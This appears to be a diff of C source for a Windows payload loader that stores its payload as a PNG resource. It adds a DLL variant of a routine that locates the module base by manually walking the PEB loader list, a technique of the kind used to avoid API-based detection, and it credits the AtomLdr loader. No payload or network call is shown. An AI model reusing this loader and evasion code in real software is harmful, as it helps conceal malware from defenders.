@@ -13,25 +13,73 @@
 #define PAYLOAD_RESOURCE_ID IDB_PNG1 // Find this value in resource.h
 #define PAYLOAD_RESOURCE_TYPE L"PNG" // Find this value in Resource.rc. Search by your resource_id.
 
+//#define DLL //Uncomment this if this code is going to be used for a DLL.
 
-
+#ifndef DLL
 /**
  * @brief Retrieves the handle of the current module via PEB using architecture-appropriate instructions (x86/x64), avoiding memory walking for reliability.
  * @return HMODULE Always returns the base address of the current module via the PEB's ImageBaseAddress field.
  */
-HMODULE hGetCurrentModuleHandle() {
-    // Retrieve the PEB pointer using the appropriate method for x86/x64
-#ifdef _WIN64
-    PPEB pPeb = (PPEB)__readgsqword(0x60);
-#else
-    PPEB pPeb = (PPEB)__readfsdword(0x30);
+    HMODULE hGetCurrentModuleHandle() {
+        // Retrieve the PEB pointer using the appropriate method for x86/x64
+    #ifdef _WIN64
+        PPEB pPeb = (PPEB)__readgsqword(0x60);
+    #else
+        PPEB pPeb = (PPEB)__readfsdword(0x30);
+    #endif
+    
+        // Return the image base address stored in the PEB
+        return (HMODULE)pPeb->ImageBaseAddress;
+    }
+#else // if DLL
+    __declspec(noinline) // Prevent inlining to ensure valid function address
+    HMODULE hGetCurrentModuleHandle() {
+        PPEB pPeb;
+    #ifdef _WIN64
+        pPeb = (PPEB)__readgsqword(0x60);
+    #define LDR_OFFSET        0x10   // Offset to InMemoryOrderLinks in LDR_DATA_TABLE_ENTRY
+    #define DLLBASE_OFFSET    0x30   // Offset to DllBase field
+    #else
+        pPeb = (PPEB)__readfsdword(0x30);
+    #define LDR_OFFSET        0x08
+    #define DLLBASE_OFFSET    0x18
+    #endif
+    
+        // Get current function's address to find containing module
+        PBYTE functionAddress = (PBYTE)hGetCurrentModuleHandle;
+    
+        PPEB_LDR_DATA ldr = pPeb->Ldr;
+        PLIST_ENTRY listHead = &ldr->InMemoryOrderModuleList;
+    
+        for (PLIST_ENTRY listEntry = listHead->Flink;
+            listEntry != listHead;
+            listEntry = listEntry->Flink) {
+    
+            // Calculate LDR_DATA_TABLE_ENTRY base from LIST_ENTRY
+            PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)listEntry - LDR_OFFSET);
+    
+            // Get module base address
+            PVOID dllBase = *(PVOID*)((PBYTE)entry + DLLBASE_OFFSET);
+            if (!dllBase) continue;
+    
+            // Validate PE headers
+            PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dllBase;
+            if (pDos->e_magic != IMAGE_DOS_SIGNATURE) continue;
+    
+            PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)dllBase + pDos->e_lfanew);
+            if (pNt->Signature != IMAGE_NT_SIGNATURE) continue;
+    
+            // Check if our function resides in this module's memory range
+            if (functionAddress >= (PBYTE)dllBase &&
+                functionAddress < (PBYTE)dllBase + pNt->OptionalHeader.SizeOfImage) {
+                return (HMODULE)dllBase;
+            }
+        }
+    
+        return NULL; // Should never reach here in valid scenarios
+    }
+
 #endif
-
-    // Return the image base address stored in the PEB
-    return (HMODULE)pPeb->ImageBaseAddress;
-}
-
-
 // This function was based on the code from https://github.com/NUL0x4C/AtomLdr
 /**
  * @brief Fetches raw data and size for a specified resource from the current module.
